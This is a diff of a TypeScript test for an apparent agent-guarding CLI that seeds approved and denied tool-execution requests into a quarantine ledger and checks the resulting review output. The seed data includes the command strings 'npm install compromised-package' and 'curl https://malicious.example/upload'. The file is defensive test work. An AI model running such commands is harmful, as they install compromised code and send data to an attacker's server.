@@ -81,35 +81,37 @@ async function main() {
     let runtimeConfig = enableBodyguardControl(restored.getConfig());
     let upl = createEmptyUserPathLedger();
 
-    const approvedRequest = {
-      requestId: "quarantine-cli-approved",
-      sessionId: runtimeConfig.session.sessionId,
-      actionKind: "tool.exec" as const,
-      target: "npm",
-      payloadSummary: "spawn:npm install compromised-package",
-      requestedAt: new Date().toISOString(),
-      provenance: "agent_inference" as const,
-      flags: {
-        authorityClaimed: true,
-      },
-    };
-    const deniedRequest = {
-      ...approvedRequest,
-      requestId: "quarantine-cli-denied",
-      target: "curl",
-      payloadSummary: "spawn:curl https://malicious.example/upload",
-    };
+    for (let index = 0; index < 6; index += 1) {
+      const approvedRequest = {
+        requestId: `quarantine-cli-approved-${index}`,
+        sessionId: runtimeConfig.session.sessionId,
+        actionKind: "tool.exec" as const,
+        target: `npm-${index}`,
+        payloadSummary: `spawn:npm install compromised-package-${index}`,
+        requestedAt: new Date().toISOString(),
+        provenance: "agent_inference" as const,
+        flags: {
+          authorityClaimed: true,
+          requestsLawMutation: true,
+        },
+      };
+      const deniedRequest = {
+        ...approvedRequest,
+        requestId: `quarantine-cli-denied-${index}`,
+        target: `curl-${index}`,
+        payloadSummary: `spawn:curl https://malicious.example/upload/${index}`,
+      };
 
-    const approvedWitness = await appendBoundaryLedger("APPROVAL_GRANTED", {
-      sessionId: runtimeConfig.session.sessionId,
-      actorId: runtimeConfig.session.actorId,
-      requestId: approvedRequest.requestId,
-      actionKind: approvedRequest.actionKind,
-      target: approvedRequest.target,
-      decision: "allow",
-      reason: "seed approved upl item for quarantine cli contract",
-      createdAt: new Date().toISOString(),
-    });
+      const approvedWitness = await appendBoundaryLedger("APPROVAL_GRANTED", {
+        sessionId: runtimeConfig.session.sessionId,
+        actorId: runtimeConfig.session.actorId,
+        requestId: approvedRequest.requestId,
+        actionKind: approvedRequest.actionKind,
+        target: approvedRequest.target,
+        decision: "allow",
+        reason: "seed approved upl item for quarantine cli contract",
+        createdAt: new Date().toISOString(),
+      });
       upl = await writeApprovedUserPathLaw({
         ledger: upl,
         request: approvedRequest,
@@ -118,16 +120,16 @@ async function main() {
         decision: { choice: "allow_as_law", scope: "SESSION" },
       });
 
-    const deniedWitness = await appendBoundaryLedger("APPROVAL_DENIED", {
-      sessionId: runtimeConfig.session.sessionId,
-      actorId: runtimeConfig.session.actorId,
-      requestId: deniedRequest.requestId,
-      actionKind: deniedRequest.actionKind,
-      target: deniedRequest.target,
-      decision: "deny",
-      reason: "seed denied upl item for quarantine cli contract",
-      createdAt: new Date().toISOString(),
-    });
+      const deniedWitness = await appendBoundaryLedger("APPROVAL_DENIED", {
+        sessionId: runtimeConfig.session.sessionId,
+        actorId: runtimeConfig.session.actorId,
+        requestId: deniedRequest.requestId,
+        actionKind: deniedRequest.actionKind,
+        target: deniedRequest.target,
+        decision: "deny",
+        reason: "seed denied upl item for quarantine cli contract",
+        createdAt: new Date().toISOString(),
+      });
       upl = await writeDeniedUserPathLaw({
         ledger: upl,
         request: deniedRequest,
@@ -135,6 +137,7 @@ async function main() {
         session: runtimeConfig.session,
         decision: { choice: "deny_as_law", scope: "SESSION" },
       });
+    }
 
     runtimeConfig = {
       ...runtimeConfig,
@@ -152,6 +155,11 @@ async function main() {
       complete: boolean;
       pitCount: number;
       processedItems: number;
+      workerCount: number;
+      approvedPitCount: number;
+      deniedPitCount: number;
+      topLawIds: Array<{ value: string; count: number }>;
+      groups: Array<{ pitCount: number; primaryReason: string }>;
       totalShards: number;
       completedShards: number;
       entries: Array<{ verdict: string }>;
@@ -160,8 +168,13 @@ async function main() {
     assert.equal(status.complete, true);
     assert.equal(status.pitCount >= 1, true);
     assert.equal(status.processedItems >= status.pitCount, true);
-    assert.equal(status.totalShards >= 1, true);
-    assert.equal(status.completedShards >= 1, true);
+    assert.equal(status.totalShards > 1, true);
+    assert.equal(status.completedShards > 1, true);
+    assert.equal(status.workerCount > 1, true);
+    assert.equal(status.approvedPitCount > 0, true);
+    assert.equal(status.deniedPitCount > 0, true);
+    assert.equal(status.topLawIds.length > 0, true);
+    assert.equal(status.groups.length > 0, true);
     assert.equal(status.entries.every((entry) => entry.verdict === "pit"), true);
 
     const consoleResult = await runCli(["console"], env, "quit\n");
@@ -169,6 +182,8 @@ async function main() {
     assert.match(consoleResult.stdout, /Shed Reboot/i);
     assert.match(consoleResult.stdout, /Boundary on Self/i);
     assert.match(consoleResult.stdout, /deny all as law/i);
+    assert.match(consoleResult.stdout, /Pit Summary/i);
+    assert.match(consoleResult.stdout, /Isolation Groups/i);
 
     const reviewInput = `2\n${Array.from({ length: status.pitCount }, () => "1").join("\n")}\n`;
     const reviewResult = await runCli(["quarantine", "review"], env, reviewInput);
